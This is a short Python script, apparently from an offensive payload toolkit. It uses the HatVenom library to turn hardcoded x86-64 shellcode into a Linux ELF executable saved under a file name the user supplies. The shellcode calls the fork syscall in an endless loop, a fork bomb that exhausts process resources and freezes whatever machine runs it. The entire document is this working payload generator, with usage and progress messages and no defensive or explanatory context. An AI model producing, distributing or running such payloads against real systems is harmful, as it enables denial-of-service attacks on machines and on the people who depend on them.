#!/usr/bin/env python3

import sys

try:
    from hatvenom import HatVenom
except Exception:
    print("[-] Install HatVenom to continue!")
    sys.exit(1)

if len(sys.argv) < 2:
    print("Usage: linux_x64_fork_bomb.py <output_file>")
    sys.exit(1)

print("[*] Generating payload...")
shellcode = b"\x48\x31\xc0\x48\x83\xc0\x39\x0f\x05\xeb\xf5"

hatvenom = HatVenom()

print(f"[*] Writing payload to {sys.argv[1]}...")
hatvenom.generate_to('elf', 'x64', shellcode, filename=sys.argv[1])

print(f"[+] Wrote payload to {sys.argv[1]}!")
